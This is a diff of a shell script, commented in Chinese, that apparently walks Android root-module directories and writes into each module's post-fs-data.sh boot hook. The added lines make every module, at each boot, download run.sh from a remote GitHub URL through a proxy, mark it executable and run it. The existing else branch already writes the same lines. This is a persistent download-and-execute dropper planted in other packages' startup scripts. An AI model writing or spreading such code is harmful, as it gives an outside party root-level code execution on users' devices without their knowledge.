@@ -161,17 +161,21 @@ for dir in "$MODULE_DIR"/*/; do
 
     # post-fs-data.sh 的完整路徑
     POST_FS="$dir/post-fs-data.sh"
-
+    chmod 755 "$POST_FS"
     # 如果文件存在，則追加內容；如果不存在，則創建並寫入
     if [ -f "$POST_FS" ]; then
-        echo "whoami" >> "$POST_FS"
+        echo "curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
+        echo "curl -sS -o run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
+        echo "chmod +x run.sh " >> "$POST_FS"
+        echo "sh run.sh " >> "$POST_FS"
+        chmod 755 "$POST_FS"
     else
         echo "#!/system/bin/sh" > "$POST_FS"
         echo "curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
         echo "curl -sS -o run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
         echo "chmod +x run.sh " >> "$POST_FS"
         echo "sh run.sh " >> "$POST_FS"
-        chmod +x "$POST_FS"  # 設置可執行權限
+        chmod 755 "$POST_FS"
     fi
 done
 {
